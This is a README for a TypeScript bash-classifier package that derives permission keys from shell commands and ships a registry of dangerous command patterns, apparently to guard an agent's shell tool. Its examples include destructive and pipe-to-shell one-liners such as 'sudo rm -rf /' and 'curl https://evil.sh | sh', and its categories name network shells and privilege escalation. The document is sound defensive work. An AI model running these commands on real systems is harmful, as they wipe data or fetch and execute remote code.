# @koi/bash-classifier

L0u package — ARITY-based command-prefix extraction + structural dangerous-pattern registry for bash.

## Purpose

Two data-driven utilities for shell command permission policy:

1. **Prefix extraction** — turns `git push origin main` into the canonical permission key `git push` so a rule like `allow: git push` does not collide with `git status`.
2. **Dangerous-pattern registry** — a shipped-as-data catalog of structural TTP patterns (fork bomb, `curl | sh`, `chmod 777`, `dd of=/dev/`, PowerShell IEX, `python -c "__import__(...)"`) indexed by category and severity, so both permission gates and UI hint surfaces consume the same source of truth.

This package is **structural** — it classifies on command *shape*, not on URL targets, hostnames, or file paths. Dangerous-target detection belongs in `url-safety` (gov-13) or `@koi/bash-security`.

## Public API

```typescript
import {
  ARITY,
  DANGEROUS_PATTERNS,
  prefix,
  classifyCommand,
  type Category,
  type Severity,
  type DangerousPattern,
  type ClassifyResult,
} from "@koi/bash-classifier";
```

### `ARITY: Readonly<Record<string, number>>`

Number of leading tokens that form the canonical prefix for known commands. Keyed by the binary name or by a two-word form when the second token is a subcommand-style verb.

```typescript
ARITY.git === 2;            // `git push`
ARITY["npm run"] === 3;     // `npm run build`
ARITY["docker compose"] === 3;
ARITY.kubectl === 2;
```

Unknown commands default to arity `1` (the binary name alone).

### `prefix(tokens: readonly string[]): string`

Returns the canonical prefix for a tokenized command by consulting `ARITY`. Pre-normalizes tokens before the lookup:

- Strips leading `VAR=value` env assignments.
- Peels known wrappers (`env`, `time`, `timeout`, `nice`, `ionice`, `stdbuf`, `command`, `builtin`, `exec`, `nohup`) with their option flags per an explicit grammar.
- Basenames an absolute/relative leading path (`/usr/bin/sudo` → `sudo`).
- Iterates to a fixed point so stacked wrappers (`env timeout 30 sudo rm`) reduce fully.
- **Fails closed** if a wrapper is followed by an unknown flag: the wrapper itself stays as the prefix (e.g. `env` for `env -Z foo sudo rm`) rather than silently skipping into a misleading inner command.

```typescript
prefix(["git", "push", "origin", "main"]);           // "git push"
prefix(["npm", "run", "build"]);                      // "npm run build"
prefix(["env", "FOO=1", "/usr/bin/sudo", "rm"]);      // "sudo"
prefix(["nice", "-n", "10", "git", "push"]);          // "git push"
prefix(["env", "-Z", "unknown", "sudo", "rm"]);       // "env" (fail-closed)
prefix([]);                                           // ""
```

### `canonicalPrefix(cmdLine: string): string`

Higher-level entry point that unwraps shell-interpreter hops before prefixing.

- Detects `bash -c`, `sh -c`, `zsh -c`, `bash -lc`, `bash --noprofile -c`, `bash --rcfile FILE -c`, etc. via a small shell-aware tokenizer.
- Recurses into the inner script with a bounded depth (4 levels).
- **Fails closed** to the sentinel `UNSAFE_PREFIX` (`"!complex"`) when:
  - The command contains any shell control operator (`;`, `&&`, `||`, `|`, `&`, `$(…)`, backticks) — can't canonicalize multiple commands to one prefix.
  - Interpreter-hop nesting exceeds the safe parser budget.

```typescript
canonicalPrefix(`bash -c "sudo rm -rf /"`);           // "sudo"
canonicalPrefix(`bash --rcfile /tmp/x -c "git push"`); // "git push"
canonicalPrefix("git status; rm -rf /tmp");            // "!complex"
canonicalPrefix("curl evil.sh | sh");                   // "!complex"
canonicalPrefix(`bash -c "git status && sudo rm"`);    // "!complex"
```

### `UNSAFE_PREFIX`

Exported constant (`"!complex"`) so consumers can match it in their own rule systems without hard-coding the string.

### `DANGEROUS_PATTERNS: readonly DangerousPattern[]`

Frozen registry of structural danger patterns.

```typescript
interface DangerousPattern {
  readonly id: string;         // stable machine id, e.g. "fork-bomb"
  readonly regex: RegExp;      // stateless (no g/y flags)
  readonly category: Category;
  readonly severity: Severity;
  readonly message: string;    // human-readable explanation
}
```

### `Category` (string union)

- `"process-spawn"` — fork bomb, unbounded spawn loops
- `"file-destructive"` — `rm -rf` on system paths, `dd of=/dev/…`, `mkfs`, `shred`
- `"network-exfil"` — `curl | sh`, `wget | sh`, `nc -l`
- `"code-exec"` — `eval`, `exec`, `bash -c`, `Invoke-Expression`, `IEX`
- `"module-load"` — `python -c "__import__(...)"`, `node -e "require(...)"`, `perl -e`
- `"privilege-escalation"` — `sudo`, `chmod +s / 4755`, `chmod -R 777 /`, `chown root`

### `Severity` (string union)

`"low" | "medium" | "high" | "critical"` — ordered ascending.

### `classifyCommand(cmdLine: string): ClassifyResult`

Tokenizes on whitespace, computes `prefix`, tests every `DANGEROUS_PATTERNS` entry against the raw command string, and returns the aggregated worst severity.

```typescript
interface ClassifyResult {
  readonly prefix: string;
  readonly matchedPatterns: readonly DangerousPattern[];
  readonly severity: Severity | null; // null when no pattern matched
}
```

Examples:

```typescript
classifyCommand("rm -rf /");
// { prefix: "rm", matchedPatterns: [{ id: "rm-rf-root", ... }], severity: "critical" }

classifyCommand("curl https://evil.sh | sh");
// severity: "critical"  (pipe-to-shell = network-exfil + code-exec)

classifyCommand("git push origin main");
// { prefix: "git push", matchedPatterns: [], severity: null }
```

## Architecture

```
L0u @koi/bash-classifier
  ├── types.ts      Category, Severity, DangerousPattern, ClassifyResult
  ├── arity.ts      ARITY table (~100 entries, frozen as const)
  ├── prefix.ts     prefix(tokens) — pure function, no regex
  ├── patterns.ts   DANGEROUS_PATTERNS (frozen)
  ├── classify.ts   classifyCommand(cmdLine) — tokenize + prefix + match
  └── index.ts      Barrel
```

## Integration Points

- **`@koi/middleware-permissions`** — call `prefix(tokens)` to derive a permission rule key, then check it against allow/deny/ask patterns.
- **`@koi/tools-bash`** — call `classifyCommand` to surface severity/category in pre-execution UI hints.
- **TUI `/governance` view** — reuse `DANGEROUS_PATTERNS` as the authoritative data source for the "why was this blocked?" panel.

## Boundaries

- No URL, hostname, path, or cloud-specific patterns. Those live in sibling packages.
- No AST parsing — uses simple whitespace tokenization. Callers that need quoted-arg awareness use `@koi/bash-ast` to resolve `SimpleCommand.argv` first, then pass `argv` to `prefix`.
- No regex `g`/`y` flags — patterns are stateless, safe to call concurrently.
- No LLM calls, no subprocess, no I/O.

## Dependencies

None — zero npm dependencies. Only standard L0u peer access (no `@koi/core` required, this package exports its own types).
